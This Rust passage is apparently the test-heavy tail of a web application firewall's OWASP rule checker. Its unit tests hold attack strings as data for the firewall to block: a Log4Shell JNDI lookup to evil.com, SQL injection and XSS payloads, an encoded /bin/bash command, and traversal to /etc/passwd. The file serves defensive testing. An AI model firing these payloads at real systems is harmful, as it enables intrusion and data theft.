        &self.summary
    }
}

impl Default for OWASPCheck {
    fn default() -> Self {
        Self::new()
    }
}

impl Check for OWASPCheck {
    fn check(&self, ctx: &RequestCtx) -> Option<DetectionResult> {
        if !ctx.host_config.defense_config.owasp_set {
            return None;
        }

        // Use paranoia level from defense config (default 1)
        let paranoia = ctx.host_config.defense_config.owasp_paranoia;

        for rule in &self.rules {
            if rule.paranoia > paranoia {
                continue;
            }
            if rule.matches(ctx) {
                return Some(DetectionResult {
                    rule_id: Some(rule.id.clone()),
                    rule_name: rule.name.clone(),
                    phase: Phase::Owasp,
                    detail: format!("OWASP rule {} triggered ({})", rule.id, rule.name),
                });
            }
        }

        None
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use bytes::Bytes;
    use std::collections::HashMap;
    use std::sync::Arc;
    use waf_common::{DefenseConfig, HostConfig};

    /// Absolute path to the shipped CRS rule set (tests run with the crate
    /// directory as CWD, so the relative default does not resolve).
    fn crs_dir() -> PathBuf {
        Path::new(env!("CARGO_MANIFEST_DIR")).join("../../rules/owasp-crs")
    }

    fn crs_data_dir() -> PathBuf {
        crs_dir().join(DATA_SUBDIR)
    }

    fn make_ctx(method: &str, path: &str, content_length: u64) -> RequestCtx {
        let dc = DefenseConfig {
            owasp_set: true,
            ..DefenseConfig::default()
        };
        let host_config = Arc::new(HostConfig {
            code: "test".into(),
            host: "example.com".into(),
            defense_config: dc,
            ..HostConfig::default()
        });
        RequestCtx {
            req_id: "test".into(),
            client_ip: "1.2.3.4".parse().unwrap(),
            client_port: 0,
            method: method.into(),
            host: "example.com".into(),
            port: 80,
            path: path.into(),
            query: String::new(),
            headers: HashMap::new(),
            body_preview: Bytes::new(),
            content_length,
            is_tls: false,
            host_config,
            geo: None,
        }
    }

    fn make_ctx_with_query(query: &str) -> RequestCtx {
        let mut ctx = make_ctx("GET", "/", 0);
        ctx.query = query.into();
        ctx
    }

    /// A context carrying a single header (and nothing else that could match).
    fn make_ctx_with_header(name: &str, value: &str) -> RequestCtx {
        let mut ctx = make_ctx("GET", "/", 0);
        ctx.headers.insert(name.into(), value.into());
        ctx
    }

    fn single_rule_yaml(field: &str, operator: &str, value: &str) -> String {
        format!(
            "version: \"1.0\"\nrules:\n  - id: TEST-RULE\n    name: test rule\n    category: test\n    \
             severity: critical\n    paranoia: 1\n    field: {field}\n    operator: {operator}\n    \
             value: {value}\n    action: block\n"
        )
    }

    #[test]
    fn test_invalid_method_blocked() {
        let checker = OWASPCheck::new();
        let ctx = make_ctx("FOOBAR", "/", 0);
        assert!(checker.check(&ctx).is_some(), "FOOBAR method should be blocked");
    }

    #[test]
    fn test_valid_method_allowed() {
        let checker = OWASPCheck::new();
        for method in &["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"] {
            let ctx = make_ctx(method, "/", 0);
            assert!(
                checker.check(&ctx).is_none(),
                "{method} should be allowed by OWASP method check"
            );
        }
    }

    #[test]
    fn test_large_body_blocked() {
        let checker = OWASPCheck::new();
        let ctx = make_ctx("POST", "/upload", 11 * 1024 * 1024); // 11 MB
        assert!(checker.check(&ctx).is_some(), "11MB body should be blocked");
    }

    #[test]
    fn test_log4shell_blocked() {
        let checker = OWASPCheck::new();
        let mut ctx = make_ctx("GET", "/", 0);
        ctx.path = "${jndi:ldap://evil.com/a}".into();
        assert!(checker.check(&ctx).is_some());
    }

    // ── detect_sqli tests ────────────────────────────────────────────────────

    const SQLI_RULE_YAML: &str = r#"
version: "1.0"
rules:
  - id: CRS-942100
    name: SQL Injection Attack Detected via libinjection
    category: sqli
    severity: critical
    paranoia: 1
    field: all
    operator: detect_sqli
    value: ""
    action: block
"#;

    #[test]
    fn detect_sqli_blocks_or_tautology() {
        let checker = OWASPCheck::from_yaml(SQLI_RULE_YAML);
        assert_eq!(checker.rule_count(), 1);
        let ctx = make_ctx_with_query("id=1' OR '1'='1");
        let result = checker.check(&ctx);
        assert!(result.is_some(), "Should detect SQL injection tautology");
    }

    #[test]
    fn detect_sqli_blocks_union_select() {
        let checker = OWASPCheck::from_yaml(SQLI_RULE_YAML);
        let ctx = make_ctx_with_query("id=1 UNION SELECT 1,2,3--");
        assert!(checker.check(&ctx).is_some(), "Should detect UNION SELECT injection");
    }

    #[test]
    fn detect_sqli_allows_clean_input() {
        let checker = OWASPCheck::from_yaml(SQLI_RULE_YAML);
        let ctx = make_ctx_with_query("name=alice&page=2");
        assert!(checker.check(&ctx).is_none(), "Should allow clean query string");
    }

    #[test]
    fn detect_sqli_checks_body() {
        let checker = OWASPCheck::from_yaml(SQLI_RULE_YAML);
        let mut ctx = make_ctx("POST", "/login", 0);
        ctx.body_preview = Bytes::from("username=admin&password=1' OR '1'='1");
        assert!(checker.check(&ctx).is_some(), "Should detect SQLi in body");
    }

    #[test]
    fn detect_sqli_checks_headers() {
        let checker = OWASPCheck::from_yaml(SQLI_RULE_YAML);
        let ctx = make_ctx_with_header("referer", "http://x/' OR '1'='1");
        assert!(checker.check(&ctx).is_some(), "Should detect SQLi in headers");
    }

    // ── detect_xss tests ─────────────────────────────────────────────────────

    const XSS_RULE_YAML: &str = r#"
version: "1.0"
rules:
  - id: CRS-941100
    name: XSS Attack Detected via libinjection
    category: xss
    severity: critical
    paranoia: 1
    field: all
    operator: detect_xss
    value: ""
    action: block
"#;

    #[test]
    fn detect_xss_blocks_script_tag() {
        let checker = OWASPCheck::from_yaml(XSS_RULE_YAML);
        assert_eq!(checker.rule_count(), 1);
        let ctx = make_ctx_with_query("q=<script>alert(1)</script>");
        assert!(checker.check(&ctx).is_some(), "Should detect script tag XSS");
    }

    #[test]
    fn detect_xss_blocks_event_handler() {
        let checker = OWASPCheck::from_yaml(XSS_RULE_YAML);
        let ctx = make_ctx_with_query("q=<img src=x onerror=alert(1)>");
        assert!(checker.check(&ctx).is_some(), "Should detect event handler XSS");
    }

    #[test]
    fn detect_xss_allows_clean_input() {
        let checker = OWASPCheck::from_yaml(XSS_RULE_YAML);
        let ctx = make_ctx_with_query("q=hello+world&page=1");
        assert!(checker.check(&ctx).is_none(), "Should allow clean input");
    }

    #[test]
    fn detect_xss_checks_body() {
        let checker = OWASPCheck::from_yaml(XSS_RULE_YAML);
        let mut ctx = make_ctx("POST", "/comment", 0);
        ctx.body_preview = Bytes::from("text=<script>alert('xss')</script>");
        assert!(checker.check(&ctx).is_some(), "Should detect XSS in body");
    }

    // ── compile_rule operator alias tests ────────────────────────────────────

    #[test]
    fn detect_sqli_modsec_alias_works() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("query", "\"@detectSQLi\"", "\"\""));
        assert_eq!(checker.rule_count(), 1, "@detectSQLi alias should compile");
    }

    #[test]
    fn detect_xss_modsec_alias_works() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("query", "\"@detectXSS\"", "\"\""));
        assert_eq!(checker.rule_count(), 1, "@detectXSS alias should compile");
    }

    // ── single-field detection tests ─────────────────────────────────────────

    #[test]
    fn detect_sqli_single_field_query() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("query", "detect_sqli", "\"\""));
        // Should detect in query
        let ctx = make_ctx_with_query("id=1' OR '1'='1");
        assert!(checker.check(&ctx).is_some(), "Should detect SQLi in query field");
        // Should NOT detect in path when field is query-only
        let ctx2 = make_ctx("GET", "/1' OR '1'='1", 0);
        assert!(checker.check(&ctx2).is_none(), "Should not check path when field=query");
    }

    // ── URL-encoded evasion tests ────────────────────────────────────────────

    #[test]
    fn detect_sqli_url_encoded_evasion() {
        let checker = OWASPCheck::from_yaml(SQLI_RULE_YAML);
        // %27 = single quote, %20 = space, %3D = equals
        let ctx = make_ctx_with_query("id=1%27%20OR%20%271%27%3D%271");
        assert!(
            checker.check(&ctx).is_some(),
            "Should detect URL-encoded SQLi after decoding"
        );
    }

    #[test]
    fn detect_xss_url_encoded_evasion() {
        let checker = OWASPCheck::from_yaml(XSS_RULE_YAML);
        // %3Cscript%3E = <script>
        let ctx = make_ctx_with_query("q=%3Cscript%3Ealert(1)%3C/script%3E");
        assert!(
            checker.check(&ctx).is_some(),
            "Should detect URL-encoded XSS after decoding"
        );
    }

    // ── Edge case tests ──────────────────────────────────────────────────────

    #[test]
    fn detect_sqli_empty_input_safe() {
        let checker = OWASPCheck::from_yaml(SQLI_RULE_YAML);
        let ctx = make_ctx("GET", "/", 0);
        assert!(checker.check(&ctx).is_none(), "Empty input should not trigger SQLi");
    }

    #[test]
    fn detect_xss_empty_input_safe() {
        let checker = OWASPCheck::from_yaml(XSS_RULE_YAML);
        let ctx = make_ctx("GET", "/", 0);
        assert!(checker.check(&ctx).is_none(), "Empty input should not trigger XSS");
    }

    #[test]
    fn detect_sqli_non_utf8_body() {
        let checker = OWASPCheck::from_yaml(SQLI_RULE_YAML);
        let mut ctx = make_ctx("POST", "/", 0);
        // Binary payload with some valid SQL-like bytes mixed in
        ctx.body_preview = Bytes::from(vec![0xFF, 0xFE, 0x00, 0x80]);
        assert!(
            checker.check(&ctx).is_none(),
            "Random binary data should not trigger SQLi"
        );
    }

    #[test]
    fn detect_sqli_paranoia_level_filtering() {
        let yaml = r#"
version: "1.0"
rules:
  - id: CRS-942100-PL3
    name: SQLi detection at paranoia level 3
    category: sqli
    severity: critical
    paranoia: 3
    field: all
    operator: detect_sqli
    value: ""
    action: block
"#;
        let checker = OWASPCheck::from_yaml(yaml);
        assert_eq!(checker.rule_count(), 1);
        // Default paranoia is 1, so PL3 rule should be skipped
        let ctx = make_ctx_with_query("id=1' OR '1'='1");
        assert!(
            checker.check(&ctx).is_none(),
            "PL3 rule should be skipped at default paranoia level 1"
        );
    }

    // ── A.1: unsupported field / operator must be rejected, never silent ─────

    #[test]
    fn unsupported_field_is_rejected_and_reported() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("response_body", "regex", "'.*'"));
        let summary = checker.load_summary();

        assert_eq!(checker.rule_count(), 0, "unsupported field must not be counted");
        assert_eq!(summary.attempted, 1);
        assert_eq!(summary.compiled, 0);
        assert_eq!(summary.rejected_field_count(), 1);
        assert_eq!(summary.rejected_field_ids(), vec!["TEST-RULE"]);
        assert!(summary.is_degraded());
        assert!(matches!(
            summary.rejected.first().map(|r| &r.reason),
            Some(RejectReason::UnsupportedField(f)) if f == "response_body"
        ));
    }

    #[test]
    fn unsupported_operator_is_rejected_and_reported() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("query", "validate_byte_range", "'1-255'"));
        let summary = checker.load_summary();

        assert_eq!(checker.rule_count(), 0, "unsupported operator must not be counted");
        assert_eq!(summary.rejected_operator_count(), 1);
        assert_eq!(summary.rejected_operator_ids(), vec!["TEST-RULE"]);
        assert_eq!(summary.rejected_field_count(), 0);
        assert!(summary.is_degraded());
    }

    #[test]
    fn scalar_operator_on_collection_field_is_rejected() {
        // `equals` / `gt` compare one value; `all` and `cookies` expand to many,
        // and the schema cannot express the CRS collection-member selector.
        for (field, operator, value) in [("cookies", "equals", "'1'"), ("all", "gt", "'0'")] {
            let checker = OWASPCheck::from_yaml(&single_rule_yaml(field, operator, value));
            let summary = checker.load_summary();
            assert_eq!(checker.rule_count(), 0, "{operator} on {field} must be rejected");
            assert_eq!(summary.count(RejectCategory::FieldOperatorMismatch), 1);
            assert_eq!(
                summary.rule_ids(RejectCategory::FieldOperatorMismatch),
                vec!["TEST-RULE"]
            );
        }
    }

    #[test]
    fn wrong_value_type_is_rejected_not_silently_dropped() {
        // `gt` with a string value used to vanish without any log at all.
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("content_length", "gt", "'0'"));
        let summary = checker.load_summary();
        assert_eq!(checker.rule_count(), 0);
        assert_eq!(summary.count(RejectCategory::InvalidValue), 1);
        assert!(matches!(
            summary.rejected.first().map(|r| &r.reason),
            Some(RejectReason::InvalidValueType { expected, .. }) if *expected == "integer"
        ));
    }

    #[test]
    fn invalid_regex_is_rejected_and_categorised() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("query", "regex", "'a('"));
        let summary = checker.load_summary();
        assert_eq!(checker.rule_count(), 0);
        assert_eq!(summary.count(RejectCategory::InvalidValue), 1);
        assert!(matches!(
            summary.rejected.first().map(|r| &r.reason),
            Some(RejectReason::InvalidRegex(_))
        ));
    }

    #[test]
    fn summary_accounts_for_every_declared_rule() {
        let yaml = r#"
version: "1.0"
rules:
  - id: OK-1
    name: supported
    category: test
    severity: critical
    paranoia: 1
    field: query
    operator: contains
    value: evil
    action: block
  - id: BAD-FIELD
    name: unsupported field
    category: test
    severity: critical
    paranoia: 1
    field: response_body
    operator: contains
    value: evil
    action: block
  - id: BAD-OP
    name: unsupported operator
    category: test
    severity: critical
    paranoia: 1
    field: query
    operator: verify_cc
    value: evil
    action: block
"#;
        let checker = OWASPCheck::from_yaml(yaml);
        let summary = checker.load_summary();
        assert_eq!(summary.attempted, 3);
        assert_eq!(summary.compiled, 1);
        assert_eq!(checker.rule_count(), 1);
        assert_eq!(summary.rejected.len(), 2);
        assert_eq!(summary.attempted, summary.compiled + summary.rejected.len());
        assert_eq!(summary.rejected_field_ids(), vec!["BAD-FIELD"]);
        assert_eq!(summary.rejected_operator_ids(), vec!["BAD-OP"]);
    }

    // ── A.2: load failures must not degrade silently ─────────────────────────

    #[test]
    fn yaml_parse_failure_is_recorded_not_silent() {
        let checker = OWASPCheck::from_yaml("rules: [ this is not: valid: yaml");
        let summary = checker.load_summary();
        assert_eq!(checker.rule_count(), 0);
        assert_eq!(summary.source_errors.len(), 1, "parse failure must be recorded");
        assert!(summary.is_degraded(), "an unparsable source is a degraded load");
        assert_eq!(summary.attempted, 0);
    }

    #[test]
    fn unreadable_directory_is_recorded_not_silent() {
        let missing = Path::new(env!("CARGO_MANIFEST_DIR")).join("does-not-exist-owasp-rules");
        let checker = OWASPCheck::from_directory(&missing);
        let summary = checker.load_summary();
        assert_eq!(checker.rule_count(), 0);
        assert_eq!(summary.source_errors.len(), 1);
        assert!(summary.is_degraded());
    }

    #[test]
    fn embedded_fallback_is_flagged_in_the_summary() {
        // Tests run from the crate directory, where `rules/owasp-crs/` does not
        // exist, so `new()` takes the embedded-fallback path.
        let checker = OWASPCheck::new();
        assert!(checker.rule_count() > 0, "fallback must still enforce something");
        assert!(
            checker.load_summary().used_embedded_fallback,
            "fallback substitution must be visible in the summary"
        );
        assert!(checker.load_summary().is_degraded());
    }

    // ── B: newly supported fields ────────────────────────────────────────────

    #[test]
    fn cookies_field_matches_individual_cookie_values() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("cookies", "contains", "evil"));
        assert_eq!(checker.rule_count(), 1);

        let hit = make_ctx_with_header("cookie", "sid=abc; theme=evil-dark; lang=en");
        assert!(checker.check(&hit).is_some(), "cookie value should match");

        let miss = make_ctx_with_header("cookie", "sid=abc; theme=dark");
        assert!(checker.check(&miss).is_none(), "clean cookies must not match");
    }

    #[test]
    fn cookies_field_ignores_cookie_names() {
        // CRS `REQUEST_COOKIES` is the *values* collection; a name-only match
        // would silently widen the rule.
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("cookies", "contains", "evil"));
        let ctx = make_ctx_with_header("cookie", "evil=1");
        assert!(checker.check(&ctx).is_none(), "cookie names are not values");
    }

    #[test]
    fn header_referer_field_positive_and_negative() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("header_referer", "regex", "'#.*'"));
        assert_eq!(checker.rule_count(), 1);
        let hit = make_ctx_with_header("referer", "http://site/page#frag");
        assert!(checker.check(&hit).is_some());
        let miss = make_ctx_with_header("referer", "http://site/page");
        assert!(checker.check(&miss).is_none());
        let absent = make_ctx("GET", "/", 0);
        assert!(checker.check(&absent).is_none(), "absent header must not match");
    }

    #[test]
    fn header_host_field_positive_and_negative() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml(
            "header_host",
            "regex",
            "'(?:^([\\d.]+|\\[[\\da-f:]+\\]|[\\da-f:]+)(:[\\d]+)?$)'",
        ));
        assert_eq!(checker.rule_count(), 1);
        let hit = make_ctx_with_header("host", "192.168.1.10:8080");
        assert!(checker.check(&hit).is_some(), "numeric Host must match CRS-920350");
        let miss = make_ctx_with_header("host", "example.com");
        assert!(checker.check(&miss).is_none());
    }

    #[test]
    fn header_host_field_reads_the_header_not_the_vhost() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("header_host", "contains", "example.com"));
        // ctx.host is "example.com" but no Host header is present: matching the
        // configured vhost instead of the header would be a false positive.
        let ctx = make_ctx("GET", "/", 0);
        assert!(checker.check(&ctx).is_none());
    }

    #[test]
    fn header_range_field_positive_and_negative() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml(
            "header_range",
            "regex",
            "'^bytes=(?:(?:\\d+)?-(?:\\d+)?\\s*,?\\s*){6}'",
        ));
        assert_eq!(checker.rule_count(), 1);
        let hit = make_ctx_with_header("range", "bytes=0-1,1-2,2-3,3-4,4-5,5-6,6-7");
        assert!(checker.check(&hit).is_some(), "6+ range fields must match");
        let miss = make_ctx_with_header("range", "bytes=0-1023");
        assert!(checker.check(&miss).is_none());
    }

    #[test]
    fn headers_field_scans_every_header_name_and_value() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("headers", "contains", "'x-evil'"));
        assert_eq!(checker.rule_count(), 1);

        // Matches on a header *name* (CRS REQUEST_HEADERS_NAMES).
        let by_name = make_ctx_with_header("x-evil-marker", "1");
        assert!(checker.check(&by_name).is_some(), "header names must be scanned");

        // Matches on a header *value*, including headers outside the curated
        // SCANNED_HEADERS list used by the heuristic checks.
        let by_value = make_ctx_with_header("x-custom-tenant", "x-evil");
        assert!(checker.check(&by_value).is_some(), "all header values must be scanned");

        let miss = make_ctx_with_header("accept", "text/html");
        assert!(checker.check(&miss).is_none());
    }

    // ── B: newly supported operators ─────────────────────────────────────────

    #[test]
    fn contains_any_matches_whitespace_separated_phrases() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml(
            "all",
            "contains_any",
            "'document.cookie window.location -moz-binding'",
        ));
        assert_eq!(checker.rule_count(), 1);

        let hit = make_ctx_with_query("q=alert(DOCUMENT.COOKIE)");
        assert!(checker.check(&hit).is_some(), "phrase match must be case-insensitive");

        let miss = make_ctx_with_query("q=hello+world");
        assert!(checker.check(&miss).is_none());
    }

    #[test]
    fn contains_any_matches_url_encoded_payload() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("all", "contains_any", "'-moz-binding'"));
        let ctx = make_ctx_with_query("q=%2Dmoz%2Dbinding");
        assert!(checker.check(&ctx).is_some(), "CRS @pm runs after urlDecodeUni");
    }

    #[test]
    fn contains_any_accepts_a_yaml_list() {
        let yaml = "version: \"1.0\"\nrules:\n  - id: TEST-RULE\n    name: t\n    category: test\n    \
                    severity: critical\n    paranoia: 1\n    field: query\n    operator: contains_any\n    \
                    value:\n      - alpha\n      - beta\n    action: block\n";
        let checker = OWASPCheck::from_yaml(yaml);
        assert_eq!(checker.rule_count(), 1);
        assert!(checker.check(&make_ctx_with_query("x=BETA")).is_some());
        assert!(checker.check(&make_ctx_with_query("x=gamma")).is_none());
    }

    #[test]
    fn contains_any_with_no_phrases_is_rejected() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("query", "contains_any", "'   '"));
        assert_eq!(checker.rule_count(), 0);
        assert_eq!(checker.load_summary().count(RejectCategory::InvalidValue), 1);
    }

    #[test]
    fn equals_operator_is_exact_and_case_sensitive() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("method", "equals", "TRACE"));
        assert_eq!(checker.rule_count(), 1);
        assert!(checker.check(&make_ctx("TRACE", "/", 0)).is_some());
        assert!(
            checker.check(&make_ctx("trace", "/", 0)).is_none(),
            "@streq is case-sensitive"
        );
        assert!(checker.check(&make_ctx("GET", "/", 0)).is_none());
    }

    // ── B: pm_from_file ──────────────────────────────────────────────────────

    #[test]
    fn pm_from_file_loads_wordlist_and_matches() {
        let checker = OWASPCheck::from_yaml_with_data_dir(
            &single_rule_yaml("path", "pm_from_file", "restricted-files.data"),
            &crs_data_dir(),
        );
        assert_eq!(checker.rule_count(), 1, "wordlist rule must compile");

        let hit = make_ctx("GET", "/app/.htaccess", 0);
        assert!(checker.check(&hit).is_some(), "restricted file must match");

        let miss = make_ctx("GET", "/index.html", 0);
        assert!(checker.check(&miss).is_none(), "ordinary path must not match");
    }

    #[test]
    fn pm_from_file_matches_url_encoded_payload() {
        let checker = OWASPCheck::from_yaml_with_data_dir(
            &single_rule_yaml("query", "pm_from_file", "unix-shell.data"),
            &crs_data_dir(),
        );
        assert_eq!(checker.rule_count(), 1);
        // "/bin/bash" percent-encoded.
        let ctx = make_ctx_with_query("cmd=%2Fbin%2Fbash");
        assert!(checker.check(&ctx).is_some(), "CRS @pmFromFile runs after urlDecodeUni");
    }

    #[test]
    fn pm_from_file_missing_wordlist_is_rejected() {
        let checker = OWASPCheck::from_yaml_with_data_dir(
            &single_rule_yaml("query", "pm_from_file", "no-such-list.data"),
            &crs_data_dir(),
        );
        let summary = checker.load_summary();
        assert_eq!(checker.rule_count(), 0);
        assert_eq!(summary.count(RejectCategory::DataFile), 1);
        assert_eq!(summary.rule_ids(RejectCategory::DataFile), vec!["TEST-RULE"]);
    }

    #[test]
    fn pm_from_file_rejects_path_traversal() {
        for name in ["'../secrets.data'", "'/etc/passwd'"] {
            let checker =
                OWASPCheck::from_yaml_with_data_dir(&single_rule_yaml("query", "pm_from_file", name), &crs_data_dir());
            assert_eq!(checker.rule_count(), 0, "{name} must not escape the data dir");
            assert_eq!(checker.load_summary().count(RejectCategory::DataFile), 1);
        }
    }

    #[test]
    fn pm_from_file_without_data_dir_is_rejected_not_skipped() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("query", "pm_from_file", "unix-shell.data"));
        assert_eq!(checker.rule_count(), 0);
        assert_eq!(checker.load_summary().count(RejectCategory::DataFile), 1);
    }

    #[test]
    fn wordlist_parsing_skips_comments_and_blanks() {
        let dir = std::env::temp_dir().join(format!("prx-waf-owasp-wordlist-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("list.data");
        std::fs::write(&path, "# a comment\n\n  spaced-entry  \nplain\n").unwrap();

        let checker =
            OWASPCheck::from_yaml_with_data_dir(&single_rule_yaml("query", "pm_from_file", "list.data"), &dir);
        assert_eq!(checker.rule_count(), 1);
        assert!(checker.check(&make_ctx_with_query("x=spaced-entry")).is_some());
        assert!(checker.check(&make_ctx_with_query("x=plain")).is_some());
        assert!(
            checker.check(&make_ctx_with_query("x=a comment")).is_none(),
            "comment lines must not become patterns"
        );

        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn empty_wordlist_is_rejected() {
        let dir = std::env::temp_dir().join(format!("prx-waf-owasp-empty-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("empty.data"), "# only comments\n\n").unwrap();

        let checker =
            OWASPCheck::from_yaml_with_data_dir(&single_rule_yaml("query", "pm_from_file", "empty.data"), &dir);
        assert_eq!(checker.rule_count(), 0);
        assert_eq!(checker.load_summary().count(RejectCategory::DataFile), 1);

        std::fs::remove_dir_all(&dir).ok();
    }

    // ── Shipped rule-set inventory ───────────────────────────────────────────

    /// Reconciliation baseline for the shipped CRS conversion.
    ///
    /// These numbers are the accounting basis for external conformance runs.
    /// If `rules/owasp-crs/` is re-synced from upstream this test is expected
    /// to fail — update it deliberately and re-publish the coverage figures.
    #[test]
    fn shipped_crs_inventory_is_fully_accounted_for() {
        let checker = OWASPCheck::from_directory(&crs_dir());
        let summary = checker.load_summary();

        assert!(summary.source_errors.is_empty(), "shipped rule set must parse cleanly");
        assert_eq!(summary.attempted, 328, "declared CRS rules");
        assert_eq!(summary.compiled, 279, "enforceable CRS rules");
        assert_eq!(checker.rule_count(), summary.compiled);
        assert_eq!(summary.attempted, summary.compiled + summary.rejected.len());

        // Everything not enforced is either a response-phase rule (needs a
        // response-body inspection hook this architecture does not have) or a
        // scalar operator applied to a collection field.
        assert_eq!(summary.rejected_field_count(), 47, "response_body rules");
        assert!(
            summary
                .rejected
                .iter()
                .filter(|r| r.reason.category() == RejectCategory::UnsupportedField)
                .all(|r| matches!(&r.reason, RejectReason::UnsupportedField(f) if f == "response_body")),
            "the only unsupported field left is response_body"
        );
        assert_eq!(
            summary.rejected_operator_count(),
            0,
            "all CRS operators are implemented"
        );
        assert_eq!(summary.count(RejectCategory::FieldOperatorMismatch), 2);
        assert_eq!(summary.count(RejectCategory::InvalidValue), 0);
        assert_eq!(summary.count(RejectCategory::DataFile), 0, "every wordlist must load");
    }

    /// A representative `pm_from_file` rule from the shipped set actually fires.
    #[test]
    fn shipped_crs_scanner_wordlist_rule_fires() {
        let checker = OWASPCheck::from_directory(&crs_dir());
        // CRS-913100 — scanners-user-agents.data on the User-Agent header.
        let ctx = make_ctx_with_header("user-agent", "sqlmap/1.7#stable (http://sqlmap.org)");
        let hit = checker.check(&ctx);
        assert!(
            hit.is_some(),
            "a known scanner UA must be detected by the shipped rules"
        );
    }
}
